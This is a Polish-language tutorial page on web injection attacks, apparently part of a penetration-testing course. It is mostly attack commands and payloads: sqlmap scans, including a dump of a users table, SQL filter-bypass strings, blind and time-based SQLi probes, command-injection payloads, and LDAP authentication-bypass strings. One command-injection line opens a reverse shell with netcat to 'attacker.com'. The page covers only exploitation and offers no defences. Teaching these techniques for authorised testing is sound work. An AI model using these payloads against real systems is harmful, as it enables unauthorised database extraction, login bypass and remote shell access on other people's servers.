---
id: "injection-attacks"
title: "💉 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)"
sidebar_position: 8
---

# 💉 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)

Ataki typu Injection polegają na wstrzyknięciu złośliwego kodu do aplikacji webowej w celu manipulacji danymi lub wykonania nieautoryzowanych poleceń. W tej sekcji omówimy najczęściej spotykane rodzaje ataków: **SQL Injection, Command Injection oraz LDAP Injection**.

---

## 🛠️ SQL Injection
SQL Injection (SQLi) polega na manipulacji zapytaniami SQL w celu uzyskania nieautoryzowanego dostępu do bazy danych.

### **1️⃣ Wykorzystanie sqlmap**
`sqlmap` to narzędzie automatyzujące wykrywanie i eksploatację SQL Injection.

#### **Podstawowe skanowanie**
```bash
sqlmap -u "http://example.com/index.php?id=1" --dbs
```
Opcje:
- `--dbs` – wyświetla dostępne bazy danych
- `--tables` – wyświetla tabele danej bazy danych
- `--columns` – wyświetla kolumny w tabeli

#### **Eksfiltracja danych**
```bash
sqlmap -u "http://example.com/index.php?id=1" -D mydb -T users --dump
```
Wyciąga wszystkie rekordy z tabeli `users`.

#### **Wykorzystanie sesji i cookies**
Jeżeli aplikacja wymaga autoryzacji:
```bash
sqlmap -u "http://example.com/profile.php?id=5" --cookie="PHPSESSID=xyz123" --dbs
```

---

## 🚀 Bypassowanie filtrów
Wiele aplikacji stosuje mechanizmy obronne, ale można je obejść stosując różne techniki:

### **1️⃣ Użycie znaków zastępczych**
```sql
?id=1' OR '1'='1
```

### **2️⃣ Zmiana kodowania**
W niektórych przypadkach można ominąć filtry poprzez enkodowanie znaków:
```sql
?id=1%27%20OR%20%271%27%3D%271
```

### **3️⃣ SQL Injection w JSON/API**
Jeśli aplikacja komunikuje się przez API:
```json
{"user": "admin' OR '1'='1", "password": "test"}
```

---

## 🔎 Blind SQLi i czasowe ataki
Jeżeli aplikacja nie zwraca błędów SQL, można wykorzystać **Blind SQL Injection**.

### **1️⃣ Boolean-based Blind SQLi**
Sprawdzenie, czy aplikacja zwraca różne wyniki dla TRUE/FALSE:
```sql
?id=1' AND 1=1 -- 
?id=1' AND 1=2 -- 
```
Jeżeli pierwszy zwraca dane, a drugi nie – aplikacja jest podatna.

### **2️⃣ Time-based Blind SQLi**
Jeśli aplikacja nie zwraca żadnych danych, można sprawdzić podatność przez opóźnienia:
```sql
?id=1' AND SLEEP(5) -- 
```
Jeśli serwer odpowiada z opóźnieniem, to aplikacja jest podatna na SQLi.

W `sqlmap`:
```bash
sqlmap -u "http://example.com/index.php?id=1" --technique=T
```

---

## 🖥️ Command Injection
Command Injection pozwala na wykonanie poleceń systemowych poprzez podatną aplikację.

### **1️⃣ Wykrywanie podatności**
Podstawowe payloady:
```bash
http://example.com/ping.php?host=127.0.0.1; id
http://example.com/ping.php?host=127.0.0.1 && whoami
```

### **2️⃣ Eksploatacja**
Przykładowe wykorzystanie:
```bash
?host=127.0.0.1 | nc -e /bin/bash attacker.com 4444
```

---

## 📂 LDAP Injection
LDAP Injection jest atakiem na systemy uwierzytelniania oparte na LDAP.

### **1️⃣ Przykład podatnego zapytania**
```bash
(&(user=admin)(password=mypassword))
```
Można go obejść poprzez:
```bash
admin)(&))(
```

### **2️⃣ LDAP Injection payloads**
- `*)(&)` – bypassowanie autoryzacji
- `*` – wyszukiwanie wszystkich użytkowników

---

Ataki Injection są jednymi z najczęściej wykorzystywanych podatności w aplikacjach webowych. Kolejnym krokiem będzie analiza podatności związanych z **Broken Authentication & Session Management**. 🔐